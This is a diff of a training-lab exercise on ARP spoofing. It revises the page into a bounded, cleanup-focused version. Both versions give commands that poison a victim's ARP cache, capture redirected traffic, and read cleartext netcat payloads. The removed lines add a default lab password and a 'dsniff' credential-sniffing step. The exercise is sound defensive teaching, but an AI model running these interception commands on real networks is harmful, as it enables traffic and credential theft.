@@ -1,241 +1,163 @@
-# Exercise 2: ARP Spoofing Attack
+# Exercise 2: Trace an ARP interception
 
-**Time Estimate**: 30-40 minutes  
-**Lab Topology**: `ot-sec-flat` (recommended) or `ot-sec-segmented`  
-**Difficulty**: :material-signal-cellular-2: Intermediate
+**Time:** 30–40 minutes. **Lab:** current student `ot-sec-flat`. **Difficulty:** Intermediate.
 
-## Learning Objectives
+Prove a change in the victim's IP-to-MAC mapping, follow the resulting traffic, and restore the original path. Use only the three named lab nodes below. These addresses refer to the simulated network inside this appliance.
 
-- Execute a Layer 2 man-in-the-middle attack
-- Understand ARP protocol vulnerabilities
-- Capture cleartext traffic during MITM attack
-- Learn detection and mitigation strategies
+**Learning objectives:** Explain ARP's trust problem, execute and prove a bounded Layer 2 interception, identify readable application data, and explain detection and mitigation.
 
-## Prerequisites
+## Before you start
 
-- Understanding of ARP protocol
-- Basic knowledge of network attacks
-- Wireshark experience
-- Root/sudo concepts
+Complete [Exercise 1](ex1-vlan-discovery.md). Open the configured terminals; no password entry or software installation is needed:
 
-## Scenario
+| Role | Terminal | Data address |
+| --- | --- | --- |
+| Attacker | [WAGO A](/network/terminal?node=wago-plc2a-vlan10) | `10.10.0.11` |
+| Victim | [WAGO B](/network/terminal?node=wago-plc2b-vlan10) | `10.10.0.12` |
+| Receiver | [DMZ jumphost](/network/terminal?node=proxmox-jumphost) | `2.2.2.2` |
 
-ARP (Address Resolution Protocol) maps IP addresses to MAC addresses on local networks. Because ARP has no authentication, an attacker can send false ARP replies to poison the ARP cache of target devices. This redirects traffic through the attacker's system, enabling man-in-the-middle attacks. In OT environments, this can intercept PLC communications, engineering workstation traffic, or HMI connections.
+Keep the tabs open. The terminals use management connections; the experiment uses data interface `eth1`. Run commands in the role named above each block. Use the exercise title in a tool tab to reopen these instructions.
 
-## Tasks
+??? info "Using standalone documentation?"
+    In your assigned lab's live **Netmap**, search each stable node name in the table. Use its action menu's **Open terminal**. For the capture, select WAGO A, **Capture packets**, interface **eth1**. Reader links make those selections automatically and retain the selected network and snapshot.
 
-### Task 1: Observe normal ARP behavior
+## Task 1: Record the real gateway mapping
 
-1. SSH into victim PLC `wago-plc2b-vlan10`:
+On **WAGO B**:
 
 ```bash
-ssh admin@192.168.100.54
+ping -c 2 10.10.0.1
+ip neigh show 10.10.0.1 dev eth1
 ```
 
-!!! info "Default Credentials"
-    Password: `admin`
-
-2. View current ARP table:
+Record the gateway MAC, not just the neighbor state (`REACHABLE` or `STALE`). On **WAGO A**:
 
 ```bash
-ip neighbor
+cat /sys/class/net/eth1/address
+cat /proc/sys/net/ipv4/ip_forward
+command -v arp_spoofing-simple.sh timeout
 ```
 
-3. Note the MAC address for gateway `10.10.0.1`
+Record A's MAC and forwarding value. The helper preserves the previous forwarding setting.
 
-4. Start continuous ping to external network:
+**Checkpoint:** The real gateway MAC differs from A's MAC. Both commands exist. If this is already a changed mapping, finish cleanup in Task 5 before proceeding.
+
+## Task 2: Establish the normal path
+
+[Open a capture on WAGO A's data port](/network/capture?node=wago-plc2a-vlan10&interface=eth1), choose **Start Capture**, then run on **WAGO B**:
 
 ```bash
-ping 1.1.1.1
+ping -c 3 2.2.2.2
 ```
 
-Leave this running (do not press Ctrl+C).
+In Wireshark use `icmp && ip.addr == 10.10.0.12`. Wait a few seconds for the view to catch up.
 
-### Task 2: Set up traffic capture
+**Checkpoint:** The pings reply, but their unicast requests and replies normally do not cross A's switched access link. Background ARP broadcasts can still appear. If victim unicast is already present, inspect the ARP mapping and selected interface before interpreting the experiment.
 
-1. Open new terminal/SSH session
-2. SSH into attacker PLC `wago-plc2a-vlan10`:
+## Task 3: Redirect the selected pair
+
+On **WAGO A**, run in the foreground:
 
 ```bash
-ssh admin@192.168.100.53
+timeout -s INT 60 arp_spoofing-simple.sh eth1 10.10.0.12 10.10.0.1
 ```
 
-3. Start Wireshark capture on link between `wago-plc2a-vlan10` and `sw-acc1`
-4. Apply filter:
+The helper targets only B and its gateway and stops automatically after 60 seconds. You can stop it earlier with **Ctrl+C**. Leave this terminal running while using B.
 
-```wireshark
-icmp
-```
-
-**Observation**: Currently you should see NO traffic because ping is not going through the attacker.
-
-### Task 3: Execute ARP spoofing attack
-
-1. On attacker (`wago-plc2a-vlan10`), run the ARP spoofing script:
+After about five seconds, on **WAGO B**:
 
 ```bash
-sudo /home/admin/arp_spoofing-simple.sh eth1 10.10.0.12 10.10.0.1
+ip neigh show 10.10.0.1 dev eth1
+ping -c 3 2.2.2.2
 ```
 
-Parameters:
+**Checkpoint:** B now associates `10.10.0.1` with A's MAC. The capture on A contains B's ICMP traffic. A packet may appear twice on A's interface as it arrives and is forwarded. ICMP redirects and some ping loss are possible; they do not invalidate the MAC and payload evidence. Ping replies alone would not prove interception.
 
-- `eth1` - interface connected to network
-- `10.10.0.12` - victim IP (wago-plc2b-vlan10)
-- `10.10.0.1` - gateway IP
+??? info "Hint: the timer expired or nothing changed"
+    Check the helper's terminal for an error. If it has stopped, repeat the bounded command and then the victim commands. Keep the filter specific to B. Do not broaden the attack to other nodes. Exit status 124 after the timeout is normal.
 
-**Expected output**:
+## Task 4: Find a harmless cleartext marker
 
-```text
-[*] Enabling IP forwarding...
-[*] Poisoning 10.10.0.12 (telling it we are 10.10.0.1)...
-[*] Poisoning 10.10.0.1 (telling it we are 10.10.0.12)...
-```
-
-2. Check Wireshark - you should now see ICMP echo requests and replies flowing through attacker
-
-3. On victim, check ARP table again:
+While the helper is running, start a bounded listener on the **DMZ jumphost**:
 
 ```bash
-ip neighbor
+timeout 45 nc -l 2323
 ```
 
-**Question**: Has the MAC address for `10.10.0.1` changed? Compare to original.
+Leave it waiting. On **WAGO B** send a marker, using no real credentials:
 
-### Task 4: Capture cleartext credentials
+```bash
+printf 'LAB-ARP-DEMO\n' | nc -N -w 3 2.2.2.2 2323
+```
 
-1. Stop the ARP spoofing script (Ctrl+C on attacker)
-2. Open new terminal and SSH into internet node `panasonic-toughbook-internet`:
+The receiver should print `LAB-ARP-DEMO`. In the capture, filter `tcp.port == 2323`, select a data packet, then right-click **Follow → TCP Stream**. Find the same marker. Close the stream window afterwards.
+
+**Checkpoint:** Record a packet number containing the marker and the changed neighbor mapping. Seeing an open port alone would not establish that application data was intercepted.
+
+??? info "Hint: no marker"
+    Start the listener before the sender. Repeat Task 3 if its timer expired. Use `tcp.port == 2323 && tcp.len > 0` to isolate data. If only SYN packets appear, check the listener and route rather than claiming payload capture.
+
+## Task 5: Restore and verify
+
+1. Press **Ctrl+C** in A's helper terminal if it is still running. Wait for its prompt; allow a few seconds for corrective ARP replies. Stop the receiver with **Ctrl+C** if it is still waiting.
+2. On **WAGO B**, refresh only this dynamic gateway entry:
 
     ```bash
-    ssh admin@192.168.100.51
+    ip neigh del 10.10.0.1 dev eth1
+    ping -c 3 10.10.0.1
+    ip neigh show 10.10.0.1 dev eth1
     ```
 
-3. On internet node, start netcat listener on port 2323:
+    If deletion reports that the entry does not exist, continue with ping.
+3. On **WAGO A**:
 
     ```bash
-    nc -l -k 2323
+    pgrep -a arpspoof
+    cat /proc/sys/net/ipv4/ip_forward
     ```
 
-    Leave this running to receive incoming connections.
+**Checkpoint:** No `arpspoof` process remains, forwarding equals your initial value, and B again uses the original gateway MAC with successful pings. A silent `pgrep` with exit status 1 means no matching process. If the mapping remains wrong, stop here and ask the instructor; do not leave an active interception behind.
 
-4. On victim (`wago-plc2b-vlan10`), send test credentials:
-
-    ```bash
-    echo "username:admin password:secretpass123" | nc 1.1.1.1 2323
-    ```
-
-5. On attacker, restart ARP spoofing:
-
-    ```bash
-    sudo /home/admin/arp_spoofing-simple.sh eth1 10.10.0.12 10.10.0.1
-    ```
-
-6. From victim, send credentials again:
-
-    ```bash
-    echo "username:admin password:secretpass123" | nc 1.1.1.1 2323
-    ```
-
-7. In Wireshark, remove ICMP filter and look for TCP traffic to port 2323
-8. Follow TCP stream to see cleartext data
-9. Check the netcat listener on internet node - it should display the received credentials
-
-## Verification
-
-Success indicators:
-
-- Attacker sees victim's ping traffic in Wireshark
-- Victim's ARP table shows attacker's MAC for gateway
-- Script output shows poisoning messages
-- TCP stream reveals cleartext credentials
-
-## Questions to Consider
-
-1. How can you detect ARP spoofing on a production network?
-2. What mitigation strategies exist (DAI, port security, static ARP)?
-3. Why is this attack particularly dangerous in OT environments?
-4. What protocols are vulnerable to MITM credential theft?
-
-## Common Issues
-
-- **Issue**: Script fails with "must be run as root"
-  - **Solution**: Use `sudo` before the script command
-
-- **Issue**: No traffic visible in Wireshark during attack
-  - **Solution**: Check IP forwarding is enabled (script does this automatically)
-
-## Advanced Challenge
-
-Use `dsniff` tool to automatically capture credentials:
-
-```bash
-sudo dsniff -i eth1
-```
-
-While running, generate HTTP or FTP traffic and observe automatic credential extraction.
-
----
+Keep the capture open for Extra 1 if desired. Otherwise close the capture and terminal tabs.
 
 ## Solution
 
-??? success "Click to reveal solution"
-    ### Pre-attack state
+??? success "Compare your evidence"
+    Before the experiment B sends routed traffic to the real gateway MAC. The forged ARP replies replace that mapping with A's MAC, so B's routed packets pass through A. The receiver and capture both show the plaintext marker. On stopping the helper and refreshing B's entry, the original mapping returns.
 
-    Victim's ARP table before attack:
+    This demonstrates unauthenticated ARP mapping and readable TCP application data in this lab. It does not establish that encrypted application contents can be decrypted. Port security alone is not an IP-to-MAC validator. Dynamic ARP Inspection needs trusted bindings, including a deliberate plan for static-addressed OT devices.
 
-    ```bash
-    ip neighbor
-    ```
+## Extra 1: Build an ARP incident timeline
 
-    Output shows:
+**Optional, 10 minutes.** Use the retained capture, or repeat Tasks 2–5.
 
-    ```text
-    10.10.0.1 dev eth1 lladdr 02:42:ac:14:00:0b REACHABLE
-    ```
+1. Apply `arp.opcode == 2 && arp.src.proto_ipv4 == 10.10.0.1`.
+2. Expand **Address Resolution Protocol** and record **Sender IP address**, **Sender MAC address** and a frame number before, during and after the experiment. If one phase is missing, label it unobserved; use your recorded neighbor table as separate evidence.
+3. Compare the claimed IP with A's known MAC. Explain why a changed mapping is stronger evidence than simply counting ARP packets.
 
-    Note this MAC address.
+**Checkpoint:** Your timeline distinguishes the real gateway mapping, the forged claim and recovery. A normal gratuitous ARP is not by itself proof of an attack. [Search the ARP field reference](https://www.wireshark.org/docs/dfref/a/arp.html) for `arp.src.hw_mac` and `arp.isgratuitous`.
 
-    ### Attack execution
+## Extra 2: Find the boundary of this interception
 
-    From attacker `wago-plc2a-vlan10`:
+**Optional, 10 minutes.** Predict whether changing B's gateway mapping intercepts every destination in `10.0.0.0/8`.
 
-    ```bash
-    sudo /home/admin/arp_spoofing-simple.sh eth1 10.10.0.12 10.10.0.1
-    ```
-
-    Output:
-
-    ```text
-    [*] Enabling IP forwarding...
-    [*] Poisoning 10.10.0.12 (telling it we are 10.10.0.1)...
-    [*] Poisoning 10.10.0.1 (telling it we are 10.10.0.12)...
-    ```
-
-    Script continues running.
-
-    ### Verification
-
-    On victim, check ARP again:
+1. Start a fresh A data-port capture and repeat the bounded helper from Task 3.
+2. While it runs, on **WAGO B**:
 
     ```bash
-    ip neighbor
+    ip route get 10.20.0.11
+    ping -c 2 10.20.0.11
+    ping -c 2 2.2.2.2
     ```
 
-    MAC for `10.10.0.1` now shows attacker's MAC instead of real gateway MAC.
+3. Compare `icmp.type == 8 && ip.src == 10.10.0.12 && ip.dst == 10.20.0.11` with `icmp.type == 8 && ip.src == 10.10.0.12 && ip.dst == 2.2.2.2` on A.
 
-    In Wireshark on attacker's interface, ICMP traffic from victim now visible.
+**Checkpoint:** The route to CtrlX `10.20.0.11` is direct on `eth1` in this `/8` flat baseline. Spoofing the gateway pair does not redirect that direct neighbor mapping; the routed jumphost traffic does cross A. Both pings can succeed while taking different Ethernet paths. The `vlan20` hostname does not create a separate VLAN.
 
-    ### Detection methods
+Repeat **all of Task 5**, then close captures and terminals. Continue with [Exercise 3](ex3-spanning-tree.md).
 
-    1. Monitor ARP tables for unexpected changes
-    2. Detect gratuitous ARP packets
-    3. Use ARP monitoring tools (arpwatch)
-    4. Compare MAC-to-IP mappings against known good state
+## Explore the topic
 
-    ### Mitigation strategies
-
-    1. Dynamic ARP Inspection (DAI) on switches
-    2. Port security limiting MAC addresses per port
-    3. Static ARP entries for critical infrastructure
-    4. Network segmentation reducing attack scope
-    5. 802.1X authentication before network access
+- [ARP specification, RFC 826](https://www.rfc-editor.org/rfc/rfc826.html): find the receive algorithm's mapping update.
+- [arpspoof manual](https://manpages.debian.org/bullseye/dsniff/arpspoof.8.en.html): compare forwarding and target selection with the helper.
+- [Cisco Dynamic ARP Inspection](https://www.cisco.com/c/en/us/support/docs/switches/lan-switch-software/222274-troubleshoot-dynamic-arp-inspection-dai.html): identify what a switch needs to validate an ARP claim.
